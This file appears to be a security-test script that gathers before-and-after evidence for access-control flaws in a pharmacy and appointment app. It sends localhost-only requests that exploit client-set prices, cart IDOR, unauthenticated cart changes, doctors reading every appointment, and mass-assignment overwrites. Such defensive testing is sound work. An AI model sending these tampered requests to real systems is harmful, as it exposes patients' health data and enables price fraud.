// Evidence capture for V-11 to V-15 (Samadinee — pricing, cart and appointment access control).
//
// Start the disposable server first, in another terminal:
//
//     cd backend && npm run dev:test
//
// Then, from the repo root:
//
//     node security-tests/capture-v11-v15.mjs            -> writes before.txt in each folder
//     node security-tests/capture-v11-v15.mjs --after    -> writes after.txt in each folder
//
// Capture "before" on unfixed code, and "after" with your fix branch checked out,
// repeating the identical steps. See security-tests/README.md.
//
// Localhost only. Every request goes to the server named in .tokens.json, which the
// dev server pins to http://localhost:4000. Nothing here touches a remote host.
//
// Order matters. Reads run before writes so each check sees the seeded data:
// V-15 reads the appointment before V-14 overwrites it, and V-13 reads Bobby's
// cart before V-12 deletes it. Restart the dev server before every run so the
// seed is fresh. /payment/checkout is never called: it crashes the server (V-06).
//
// Requests are sent with Node's fetch(), not curl. Each "> fetch METHOD url" line in
// the output is the request this script really sent. For the same attacks run with
// the curl binary, see curl-v11-v15.sh and the *-curl.txt files it writes.

import fs from "node:fs/promises";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(here, "..");
const mode = process.argv.includes("--after") ? "after" : "before";

let tokens;
try {
    tokens = JSON.parse(await fs.readFile(path.join(here, ".tokens.json"), "utf8"));
} catch {
    console.error("\n  Could not read security-tests/.tokens.json");
    console.error("  Start the test server first:  cd backend && npm run dev:test\n");
    process.exit(1);
}

const BASE = tokens.baseUrl;
const { accounts: acc, ids } = tokens;

// --- small helpers -----------------------------------------------------------

async function call(method, route, { cookie, body } = {}) {
    const headers = {};
    if (cookie) headers.Cookie = cookie;
    if (body) headers["Content-Type"] = "application/json";
    const res = await fetch(BASE + route, {
        method,
        headers,
        body: body ? JSON.stringify(body) : undefined,
        redirect: "manual",
    });
    const text = await res.text();
    let json;
    try {
        json = JSON.parse(text);
    } catch {
        json = undefined;
    }
    return { status: res.status, text, json };
}

const git = (args) => execFileSync("git", args, { cwd: repoRoot, encoding: "utf8" }).trim();
const clip = (s, n = 900) => (s.length > n ? `${s.slice(0, n)}\n… [truncated, ${s.length} bytes total]` : s);
const indent = (s) => s.split("\n").map((l) => `  ${l}`);
const show = (res) => [`  HTTP ${res.status}`, ...indent(clip(res.text))];
const who = (name) => `${name} (${acc[name].role}, id ${acc[name].id})`;
const ck = (name) => `[with ${name}'s session cookie]`;

// Lines of source that contain a pattern, as "file:line: text".
async function grepSource(file, pattern) {
    const lines = (await fs.readFile(path.join(repoRoot, file), "utf8")).split("\n");
    return lines
        .map((l, i) => [i + 1, l])
        .filter(([, l]) => pattern.test(l))
        .map(([n, l]) => `  ${file}:${n}:  ${l.trim()}`);
}

// Real medicines from the seeded catalogue, so each check uses its own row and the
// cart's add/remove toggle never collides between checks.
async function medicines(n) {
    const res = await call("GET", "/api/v1/medicines/search-medicine?search=Testomycin");
    const list = res.json?.data ?? [];
    if (list.length < n) throw new Error(`needed ${n} medicines, search returned ${list.length}`);
    return list.slice(0, n);
}

// --- the checks --------------------------------------------------------------

async function v11(med) {
    const qty = 99;
    const honest = med.price * qty;
    const body = { userId: acc.dana.id, medicineId: med._id, quantity: qty, totalPrice: 1, status: "Pending" };
    const res = await call("POST", "/api/v1/medicines-cart/add-to-cart", { cookie: acc.dana.cookie, body });
    const stored = res.json?.data;

    return {
        folder: "v11-client-side-price",
        title: "V-11 The client decides the price and the server stores it",
        lines: [
            "WHAT THIS PROVES",
            "  The cart never looks the price up. Whatever totalPrice the browser sends is",
            "  saved as-is, so a patient can put 99 items in the cart for a total of 1.",
            "",
            "METHOD: black box (request tampering, sent by this Node script) + white box (read the source)",
            "",
            "STEP 1 — the real price, from the server's own catalogue",
            `> fetch GET $BASE/api/v1/medicines/search-medicine?search=Testomycin`,
            `  "${med.name}"  price ${med.price}  (id ${med._id})`,
            `  ${qty} x ${med.price} = ${honest}   <-- what the total should be`,
            "",
            `STEP 2 — logged in as ${who("dana")}, send a total of 1 instead`,
            `> fetch POST $BASE/api/v1/medicines-cart/add-to-cart ${ck("dana")}`,
            `  body: ${JSON.stringify(body)}`,
            ...show(res),
            "",
            stored
                ? `  RESULT: stored quantity=${stored.quantity}, totalPrice=${stored.totalPrice} ` +
                  `(should be ${honest}) — ${stored.totalPrice === honest ? "server recalculated, NOT vulnerable" : "client price accepted"}`
                : `  RESULT: nothing stored (HTTP ${res.status}) — the tampered price was refused`,
            "",
            "WHITE BOX — where the price comes from",
            ...(await grepSource("backend/src/controllers/UserCart.controller.js", /req\.body|totalPrice,$/)),
            ...(await grepSource("backend/src/controllers/payment.controller.js", /amount:/)),
            "",
            "  Both the cart total and the Razorpay order amount come straight from req.body.",
            "  Neither reads Medicine.price.",
            "",
            "NOT TESTED — /payment/checkout",
            "  Calling it crashes the whole server (V-06: `instance` is never defined), so the",
            "  payment side is shown from the source only. The cart side above is the live proof.",
        ],
    };
}

async function v13() {
    const own = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.dana.id}`, { cookie: acc.dana.cookie });
    const res = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.bobby.id}`, { cookie: acc.dana.cookie });
    const rows = res.json?.data ?? [];
    const leaked = rows.filter((r) => r.userId === acc.bobby.id);

    return {
        folder: "v13-cart-idor",
        title: "V-13 IDOR: one patient can read another patient's cart",
        lines: [
            "WHAT THIS PROVES",
            "  The cart route checks that you are *a* patient, but not *which* patient. The",
            "  user ID comes from the URL, so any logged-in patient can read anyone's cart.",
            "",
            "METHOD: black box — two accounts, swap the ID in the URL",
            "",
            `  attacker : ${who("dana")}`,
            `  victim   : ${who("bobby")}  (seed puts one private row in his cart)`,
            "",
            "CONTROL — Dana reads her own cart",
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.dana.id} ${ck("dana")}`,
            ...show(own),
            "",
            "ATTACK — Dana, with her own cookie, asks for Bobby's cart",
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.bobby.id} ${ck("dana")}`,
            ...show(res),
            "",
            leaked.length
                ? `  RESULT: ${leaked.length} row(s) belonging to Bobby returned to Dana — ` +
                  `quantity ${leaked[0].quantity}, totalPrice ${leaked[0].totalPrice}, status ${leaked[0].status}`
                : `  RESULT: no rows of Bobby's returned (HTTP ${res.status}) — access refused`,
            "",
            "WHITE BOX — the ID the query trusts",
            ...(await grepSource("backend/src/controllers/UserCart.controller.js", /req\.params\.userId|const \{ userId/)),
            "",
            "  Neither line compares the ID with req.user._id, the user the session belongs to.",
        ],
    };
}

async function v12(med) {
    const guarded = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.bobby.id}`);
    const addBody = { userId: acc.bobby.id, medicineId: med._id, quantity: 5, totalPrice: 500, status: "Pending" };
    const add = await call("POST", "/api/v1/medicines-cart/add-to-cart", { body: addBody });
    const del = await call("DELETE", `/api/v1/medicines-cart/delete-from-cart/${ids.cartId}`);
    const after = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.bobby.id}`, { cookie: acc.bobby.cookie });
    const rows = after.json?.data ?? [];
    const seededGone = !rows.some((r) => r._id === ids.cartId);
    const planted = rows.some((r) => r.medicineId === med._id);

    return {
        folder: "v12-cart-no-auth",
        title: "V-12 Two of the three cart routes have no login check",
        lines: [
            "WHAT THIS PROVES",
            "  The login middleware is imported in UserCart.routes.js but applied to only one",
            "  of its three routes. Adding to and deleting from any cart needs no login at all.",
            "",
            "METHOD: black box — requests with NO cookie, then confirm with the victim's own view",
            "",
            "THE ROUTE FILE",
            ...(await grepSource("backend/src/routes/UserCart.routes.js", /^router\./)),
            "",
            "CONTROL — the one guarded route, no cookie",
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.bobby.id} [no cookie]`,
            ...show(guarded),
            "",
            "ATTACK 1 — write into Bobby's cart, no cookie",
            `> fetch POST $BASE/api/v1/medicines-cart/add-to-cart [no cookie]`,
            `  body: ${JSON.stringify(addBody)}`,
            ...show(add),
            "",
            "ATTACK 2 — delete Bobby's seeded cart row, no cookie",
            `> fetch DELETE $BASE/api/v1/medicines-cart/delete-from-cart/${ids.cartId} [no cookie]`,
            ...show(del),
            "",
            "CONFIRM — Bobby logs in and looks at his own cart",
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.bobby.id} ${ck("bobby")}`,
            ...show(after),
            "",
            `  RESULT: row planted by an anonymous request present : ${planted ? "YES" : "no"}`,
            `          seeded row ${ids.cartId} deleted anonymously : ${seededGone ? "YES" : "no"}`,
            "",
            "TOOLING NOTE",
            "  Semgrep and njsscan do not flag this — nothing in the code *text* is wrong; the",
            "  bug is a middleware that is missing. Found by reading the route file, proven with live requests.",
        ],
    };
}

async function v15() {
    const res = await call("GET", "/api/v1/appointment/getall", { cookie: acc.alpha.cookie });
    const list = res.json?.data ?? [];
    const foreign = list.filter((a) => a.doctor !== acc.alpha.id);
    const a = foreign[0];

    return {
        folder: "v15-doctor-sees-all-appointments",
        title: "V-15 Every doctor can read every patient's appointments",
        lines: [
            "WHAT THIS PROVES",
            "  getAllAppointments() runs Appointment.find() with no filter. Any doctor receives",
            "  every appointment in the system, including patients they have never treated.",
            "",
            "METHOD: black box — log in as a doctor unrelated to the seeded appointment",
            "",
            `  caller      : ${who("alpha")}`,
            `  appointment : ${ids.appointmentId}  — patient Alice, booked with Dr Beta (id ${acc.beta.id})`,
            "",
            `> fetch GET $BASE/api/v1/appointment/getall ${ck("alpha")}`,
            ...show(res),
            "",
            a
                ? `  RESULT: ${foreign.length} appointment(s) belonging to other doctors returned to Dr Alpha.\n` +
                  `          Exposed: patient "${a.patientFirstName} ${a.patientLastName}", city ${a.city}, ` +
                  `pincode ${a.pincode},\n          date ${a.appointmentDate}, department "${a.department}".`
                : `  RESULT: no other doctor's appointments returned (HTTP ${res.status}) — scoped correctly`,
            "",
            "WHITE BOX",
            ...(await grepSource("backend/src/controllers/appointment.controller.js", /Appointment\.find\(/)),
            "",
            "  A patient's name, location and medical department (Oncology) is health data.",
            "  Compare the original README's claim of \"safeguarding sensitive patient data\".",
        ],
    };
}

async function v14() {
    const body = {
        status: "Accepted",
        appointmentCharges: "1",
        city: "HACKED",
        department: "HACKED-DEPT",
        patientFirstName: "Overwritten",
    };
    const res = await call("PUT", `/api/v1/appointment/update/${ids.appointmentId}`, { cookie: acc.alpha.cookie, body });
    const d = res.json?.data;
    const written = d ? Object.keys(body).filter((k) => d[k] === body[k]) : [];

    return {
        folder: "v14-appointment-mass-assignment",
        title: "V-14 Any doctor can rewrite any field of any appointment",
        lines: [
            "WHAT THIS PROVES",
            "  updateAppointmentStatus() passes the whole request body to findByIdAndUpdate().",
            "  Nothing limits it to the status field, and nothing checks that the appointment",
            "  belongs to the doctor making the request.",
            "",
            "METHOD: black box — a doctor edits another doctor's appointment, adding extra fields",
            "",
            `  caller      : ${who("alpha")}`,
            `  appointment : ${ids.appointmentId}  — patient Alice, booked with Dr Beta (id ${acc.beta.id})`,
            "  seeded values: patientFirstName \"Alice\", appointmentCharges \"3000\", city \"Kandy\",",
            "                 department \"Oncology\", status \"Pending\"",
            "",
            `> fetch PUT $BASE/api/v1/appointment/update/${ids.appointmentId} ${ck("alpha")}`,
            `  body: ${JSON.stringify(body)}`,
            ...show(res),
            "",
            d
                ? `  RESULT: ${written.length} of ${Object.keys(body).length} submitted fields written: ${written.join(", ")}\n` +
                  `          on an appointment whose doctor is ${d.doctor} (Dr Beta), by Dr Alpha.`
                : `  RESULT: update refused (HTTP ${res.status})`,
            "",
            "WHITE BOX",
            ...(await grepSource("backend/src/controllers/appointment.controller.js", /findByIdAndUpdate\(id, req\.body/)),
            "",
            "  The function is named \"update status\", but req.body goes to the database whole.",
        ],
    };
}

// --- run and write -----------------------------------------------------------

let branch = "?";
let commit = "?";
try {
    branch = git(["rev-parse", "--abbrev-ref", "HEAD"]);
    commit = git(["rev-parse", "--short", "HEAD"]);
} catch {
    // not fatal: evidence still records everything else
}

const [m1, m2] = await medicines(2);
const results = [];
results.push(await v11(m1));
results.push(await v13()); // reads Bobby's cart before V-12 deletes from it
results.push(await v12(m2));
results.push(await v15()); // reads the appointment before V-14 overwrites it
results.push(await v14());

const stamp = new Date().toISOString();
for (const r of results) {
    const header = [
        r.title,
        "=".repeat(r.title.length),
        "",
        `state    : ${mode.toUpperCase()} the fix`,
        `captured : ${stamp}`,
        `branch   : ${branch}`,
        `commit   : ${commit}`,
        `tool     : Node.js ${process.version} fetch() — requests sent by security-tests/capture-v11-v15.mjs`,
        `           (the same attacks with the real curl binary: ${mode}-curl.txt in this folder)`,
        `target   : ${BASE}  (disposable in-memory database, localhost only)`,
        "",
        "-".repeat(78),
    ];
    const dir = path.join(here, r.folder);
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(path.join(dir, `${mode}.txt`), [...header, ...r.lines, ""].join("\n"));
    console.log(`  wrote ${path.relative(repoRoot, path.join(dir, `${mode}.txt`))}`);
}
